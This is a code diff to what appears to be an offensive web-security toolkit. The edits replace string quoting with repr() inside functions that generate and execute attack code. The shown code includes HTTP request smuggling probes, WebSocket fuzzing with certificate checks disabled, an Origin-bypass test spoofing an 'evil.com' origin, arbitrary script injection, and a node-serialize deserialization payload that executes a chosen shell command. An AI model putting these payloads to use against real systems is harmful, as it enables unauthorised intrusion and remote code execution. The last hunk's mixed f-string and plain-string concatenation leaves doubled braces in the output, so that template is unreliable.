@@ -440,7 +440,7 @@ def tool_http_smuggle(target_url: str, operation: str = "detect", **params) -> s
     host = p.hostname; path = p.path or "/"; port = p.port or (443 if p.scheme=="https" else 80)
     if operation == "detect":
         code = f"""import socket,ssl,time
-host,port=\'{host}\',{port}
+host,port={repr(host)},{port}
 def raw(payload,timeout=6):
     s=socket.socket(); s.settimeout(timeout); s.connect((host,port))
     if port==443:
@@ -509,7 +509,7 @@ def tool_websocket_fuzz(url: str, operation: str = "connect",
         code = f"""import websocket,threading,time
 received=[]
 def on_msg(ws,m): received.append(m); print(f'<< {{m[:200]}}')
-ws=websocket.WebSocketApp(\'{url}\',on_message=on_msg)
+ws=websocket.WebSocketApp({repr(url)},on_message=on_msg)
 t=threading.Thread(target=ws.run_forever,daemon=True); t.start()
 time.sleep(min({timeout},10)); ws.close()
 print(f\'{{len(received)}} messages received\')"""
@@ -519,7 +519,7 @@ print(f\'{{len(received)}} messages received\')"""
         code = f"""import websocket,time
 for p in {pl}:
     try:
-        ws=websocket.create_connection(\'{url}\',timeout=5,sslopt={{'cert_reqs':0}})
+        ws=websocket.create_connection({repr(url)},timeout=5,sslopt={{'cert_reqs':0}})
         ws.send(str(p)); resp=ws.recv(); ws.close()
         print(f'>> {{str(p)[:60]}} | << {{resp[:100]}}')
     except Exception as e: print(f'>> {{str(p)[:40]}} ERR:{{e}}')
@@ -529,14 +529,14 @@ for p in {pl}:
         code = f"""import websocket,time
 for origin in ['null','http://evil.com','http://localhost','file://']:
     try:
-        ws=websocket.create_connection(\'{url}\',timeout=5,header=[f'Origin: {{origin}}'],sslopt={{'cert_reqs':0}})
+        ws=websocket.create_connection({repr(url)},timeout=5,header=[f'Origin: {{origin}}'],sslopt={{'cert_reqs':0}})
         ws.send('test'); resp=ws.recv(); ws.close()
         print(f'ALLOWED: {{origin}} | {{resp[:80]}}')
     except Exception as e: print(f'BLOCKED: {{origin}} | {{str(e)[:50]}}')
     time.sleep(0.3)"""
         return tool_execute_python(code, timeout=25)
     if operation == "inject" and script:
-        return tool_execute_python(f"import websocket\nws=websocket.create_connection(\'{url}\',timeout=15,sslopt={{'cert_reqs':0}})\n{script}\nws.close()", timeout=timeout+5)
+        return tool_execute_python(f"import websocket\nws=websocket.create_connection({repr(url)},timeout=15,sslopt={{'cert_reqs':0}})\n{script}\nws.close()", timeout=timeout+5)
     return "Available: connect, fuzz, origin_bypass, inject"
 
 
@@ -986,7 +986,7 @@ print("Capture variant (b64):", base64.b64encode(payload2).decode())
         return ("Node.js deserialization exploit (node-serialize):\n"
                 f'  var serialize = require("node-serialize");\n'
                 f'  var payload = {{"rce": "_$$ND_FUNC$$_function(){{require(\'child_process\')'
-                f'.exec(\'{command}\', function(e,s,_){{console.log(s)}})}}()"}}\n'
+                f'.exec(' + repr(command) + ', function(e,s,_){console.log(s)})}}()"}}\n'
                 f'  console.log(serialize.serialize(payload));  // URL-encode for cookie/param\n\n'
                 "  Detection: look for unserialize() calls in node-serialize or funcster packages")
 
